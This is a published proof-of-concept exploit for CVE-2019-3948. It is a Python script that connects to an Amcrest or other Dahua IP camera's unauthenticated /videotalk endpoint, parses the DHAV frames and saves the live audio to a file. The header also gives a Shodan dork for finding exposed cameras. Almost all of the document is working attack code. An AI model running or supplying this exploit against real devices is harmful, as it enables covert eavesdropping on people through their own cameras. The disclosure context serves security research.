# Exploit Title: Unauthenticated Audio Streaming from Amcrest Camera
# Shodan Dork: html:"@WebVersion@"
# Exploit Author: Jacob Baines
# Vendor Homepage: https://amcrest.com/
# Software Link: https://amcrest.com/firmwaredownloads
# Affected Version: V2.520.AC00.18.R
# Fixed Version: V2.420.AC00.18.R
# Tested on: Tested on Amcrest IP2M-841 but known to affect other Dahua devices.
# CVE : CVE-2019-3948
# Disclosure: https://www.tenable.com/security/research/tra-2019-36
# Disclosure: https://sup-files.s3.us-east-2.amazonaws.com/Firmware/IP2M-841/JS+IP2M-841/Changelog/841_721_HX1_changelog_20190729.txt
#
# To decode the scripts output using ffplay use:
# 	ffplay -f alaw -ar 8k -ac 1 [poc output]
# Note that this assumes the camera is using the default encoding options.
##
import argparse
import socket
import struct
import sys

##
# Read in the specified amount of data. Continuing looping until we get it all...
# what could go wrong?
#
# @return the data we read in
##
def recv_all(sock, amount):
	data = &#039;&#039;
	while len(data) != amount:
		temp_data = sock.recv(amount - len(data))
		data = data + temp_data

	return data

top_parser = argparse.ArgumentParser(description=&#039;Download audio from the HTTP videotalk endpoint&#039;)
top_parser.add_argument(&#039;-i&#039;, &#039;--ip&#039;, action="store", dest="ip", required=True, help="The IPv4 address to connect to")
top_parser.add_argument(&#039;-p&#039;, &#039;--port&#039;, action="store", dest="port", type=int, help="The port to connect to", default="80")
top_parser.add_argument(&#039;-o&#039;, &#039;--output&#039;, action="store", dest="output", help="The file to write the audio to")
top_parser.add_argument(&#039;-b&#039;, &#039;--bytes&#039;, action="store", dest="bytes", type=int, help="The amount of audio to download", default="1048576")
args = top_parser.parse_args()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setblocking(True)

print "[+] Attempting connection to " + args.ip + ":" + str(args.port)
sock.connect((args.ip, args.port))
print "[+] Connected!"

request = (&#039;GET /videotalk HTTP/1.1\r\n&#039; +
	       &#039;Host: &#039; + args.ip + &#039;:&#039; + str(args.port) + &#039;\r\n&#039; +
	       &#039;Range: bytes=0-\r\n&#039; +
	       &#039;\r\n&#039;)
sock.sendall(request)

status = &#039;&#039;
header = &#039;&#039;

# read in the HTTP response. Store the status.
while (header != &#039;\r\n&#039;):
	header = header + sock.recv(1);
	if (header.find(&#039;\r\n&#039;) > 0):
		header = header.strip()
		if (len(status) == 0):
			status = header
		header = &#039;&#039;

if (status.find(&#039;200 OK&#039;) == -1):
	print &#039;[-] Bad HTTP status. We received: "&#039; + status + &#039;"&#039;
	sock.close()
	exit()
else:
	print &#039;[+] Downloading &#039; + str(args.bytes) + &#039; bytes of audio ...&#039;

total_audio = &#039;&#039;
while (len(total_audio) < args.bytes):

	# read in the header length
	header_length = recv_all(sock, 4)
	hlength = struct.unpack("I", header_length)[0]
	if (hlength != 36):
		print &#039;[-] Unexpected header length&#039;
		sock.close()
		exit()

	# read in the header and extract the payload length
	header = recv_all(sock, hlength)
	plength = struct.unpack_from(">H", header)[0]
	if (plength != 368):
		print &#039;[-] Unexpected payload length&#039;
		sock.close()
		exit()

	# there is a seq no in the header but since this is over
	# tcp is sort of useless.

	dhav = header[2:6]
	if (dhav != "DHAV"):
		print &#039;[-] Invalid header&#039;
		exit(0)

	# extract the audio. I&#039;m really not sure what the first 6 bytes are
	# but the last 8 serve as a type of trailer
	whatami = recv_all(sock, 6)
	audio = recv_all(sock, plength - hlength - 12)
	trailer = recv_all(sock, 8)

	if (trailer != &#039;dhavp\x01\x00\x00&#039;):
		print &#039;[-] Invalid end of frame&#039;
		sock.close()
		exit()

	total_audio = total_audio + audio
	sys.stdout.write(&#039;\r&#039;+ str(len(total_audio)) + " / " + str(args.bytes))
	sys.stdout.flush()

print &#039;&#039;
print &#039;[+] Finished receiving audio.&#039;
print &#039;[+] Closing socket&#039;

out_file = open(args.output, &#039;wb&#039;)
out_file.write(total_audio)
out_file.close()

sock.close()

